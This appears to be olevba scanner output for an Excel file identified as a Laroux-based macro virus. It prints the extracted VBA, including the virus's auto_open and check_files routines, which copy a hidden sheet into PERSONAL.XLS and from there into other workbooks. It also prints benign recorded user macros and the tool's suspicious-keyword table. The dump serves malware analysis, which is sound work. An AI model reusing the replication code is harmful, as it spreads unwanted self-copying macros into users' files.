olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-a01d77133e17369ae24ecc18ba6bfc2b9cfe3764
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO laroux.bas 
in file: Virus.MSExcel.Laroux-based-a01d77133e17369ae24ecc18ba6bfc2b9cfe3764 - OLE stream: '_VBA_PROJECT_CUR/VBA/laroux'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Public aba As String
Public abY As String
Public abM As String
Public abD As String


Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "PERSONAL.XLS")
    If m$ = "PERSONAL.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("laroux").Visible = True
    Sheets("laroux").Select
    Sheets("laroux").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "PERSONAL.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("laroux").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "personal.xls!check_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "laroux" Then
        Workbooks("PERSONAL.XLS").Sheets("laroux").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("laroux").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "personal.xls!check_files"
    Case Else
End Select
End Sub


' Footer Macro
' Macro recorded 07/12/95 by Andrzej Bujniewicz
'
' Keyboard Shortcut: Ctrl+f
'
Sub Footer()
Attribute Footer.VB_ProcData.VB_Invoke_Func = " \n14"
                 
                 With ActiveSheet.PageSetup
                                  
                                  .LeftFooter = _
                                                   "&""Courier New,Italic""&8&F""&A"""
                 End With
                 ActiveSheet.PrintPreview
                 
End Sub


'
' FilterOff Macro
' Macro recorded 7/31/95 by miles clarke
'
' Keyboard Shortcut: Ctrl+o
'
Sub FilterOff()
Attribute FilterOff.VB_ProcData.VB_Invoke_Func = " \n14"
    
    Sheets("CrewListaux1").Select
    Selection.AutoFilter
End Sub


' PageSetUp Macro
' Macro recorded 19/08/95 by miles clarke
'
' Keyboard Shortcut: Ctrl+s
'
Sub PageSetup()
Attribute PageSetup.VB_ProcData.VB_Invoke_Func = " \n14"
    With ActiveSheet.PageSetup
        .LeftHeader = ""
        .CenterHeader = ""
        .RightHeader = ""
        .LeftFooter = ""
        .CenterFooter = ""
        .RightFooter = ""
        .LeftMargin = Application.InchesToPoints(0.748031496062992)
        .RightMargin = Application.InchesToPoints(0.748031496062992)
        .TopMargin = Application.InchesToPoints(0.984251968503937)
        .BottomMargin = Application.InchesToPoints(0.984251968503937)
        .HeaderMargin = Application.InchesToPoints(0.511811023622047)
        .FooterMargin = Application.InchesToPoints(0.511811023622047)
        .PrintHeadings = False
        .PrintGridlines = True
        .PrintNotes = False
        .CenterHorizontally = True
        .CenterVertically = False
        .Orientation = xlPortrait
        .Draft = False
        .PaperSize = xlPaperA4
        .FirstPageNumber = xlAutomatic
        .Order = xlDownThenOver
        .BlackAndWhite = False
        .Zoom = 100
    End With
    ActiveSheet.PrintPreview
End Sub

'
' OpenCrewList Macro
' Macro recorded 05/23/96 by Baskunchak
'
'
Sub OpenCrewList()
Attribute OpenCrewList.VB_ProcData.VB_Invoke_Func = " \n14"
    Workbooks.Open FileName:="D:\HEIKO\DATABASE.XLS"
End Sub
'
' ExitCrewList Macro
' Macro recorded 05/23/96 by Baskunchak
'
'
Sub ExitCrewList()
Attribute ExitCrewList.VB_ProcData.VB_Invoke_Func = " \n14"
    ActiveWorkbook.Close
End Sub

'
' Print1Page Macro
' Macro recorded 06/07/96 by Baskunchak
'
' Keyboard Shortcut: Ctrl+a
'
Sub Print1Page()
Attribute Print1Page.VB_ProcData.VB_Invoke_Func = " \n14"
    ActiveWindow.SelectedSheets.PrintOut From:=1, To:=1, Copies:=1
End Sub
'
' OpenCrewDatabase Macro
' Macro recorded 07/13/96 by Baskunchak
'
'
Sub OpenCrewDatabase()
Attribute OpenCrewDatabase.VB_ProcData.VB_Invoke_Func = " \n14"
    ChDir "D:\HEIKO"
    Workbooks.Open FileName:="DATABASE.XLS"
End Sub

'
' ToolbarsAB Macro
' Macro recorded 09/18/96 by Baskunchak
'
'
Sub ToolbarsAB()
Attribute ToolbarsAB.VB_ProcData.VB_Invoke_Func = " \n14"
    Toolbars(1).Visible = False
    Toolbars("Captain1").Visible = True
    Toolbars("Captain2").Visible = True
    With Application
        .ShowToolTips = False
        .LargeButtons = False
        .ColorButtons = True
    End With
End Sub
'
' ToolbarsAB_Off Macro
' Macro recorded 09/18/96 by Baskunchak
'
'
Sub ToolbarsAB_Off()
Attribute ToolbarsAB_Off.VB_ProcData.VB_Invoke_Func = " \n14"
    Toolbars(1).Visible = True
    Toolbars("Captain1").Visible = False
    Toolbars("Captain2").Visible = False
    With Application
        .ShowToolTips = False
        .LargeButtons = False
        .ColorButtons = True
    End With
End Sub


'
' Macro1 Macro
' Macro recorded 09/23/96 by Baskunchak
'
'
Sub Macro1()
Attribute Macro1.VB_ProcData.VB_Invoke_Func = " \n14"
End Sub
'
' OpenDailyRpt Macro
' Macro recorded 09/23/96 by Baskunchak
'
'
Sub OpenDailyRpt()
Attribute OpenDailyRpt.VB_ProcData.VB_Invoke_Func = " \n14"
    ChDir "C:\DAILYREP"
End Sub


'
' OpenExcelCaptain Macro
' Macro recorded 09/23/96 by Baskunchak
'
'
Sub OpenExcelCaptain()
Attribute OpenExcelCaptain.VB_ProcData.VB_Invoke_Func = " \n14"
    ChDir "C:\WINDOWS\EXCEL\ABA"
    
End Sub

'
'macro opening Inventory List.
'deleting updating person's name and prompting to write it again.
'otherwise it's not possible to save it.
'
Sub OpenInv_List()
Attribute OpenInv_List.VB_ProcData.VB_Invoke_Func = " \n14"
    Workbooks.Open FileName:="C:\WINDOWS\EXCEL\ABA\BASKINV1.XLS"
    Sheets("inventory").Select
    Range("J2").Select
    Selection.ClearContents
    Range("G4").Select
    ActiveSheet.Protect DrawingObjects:=True, Contents:=True, Scenarios _
        :=True

End Sub


'
'procedura do otrzymania aktualnej daty jako tekstu do nazwy arkusza
'
'
Sub abaData()
Attribute abaData.VB_ProcData.VB_Invoke_Func = " \n14"
    abY = Year(Date)
    abM = Month(Date)
    abD = Day(Date)
    aba = Right(abY, 2) + abM + abD
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - Visual Basic module, hidden -  larou
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

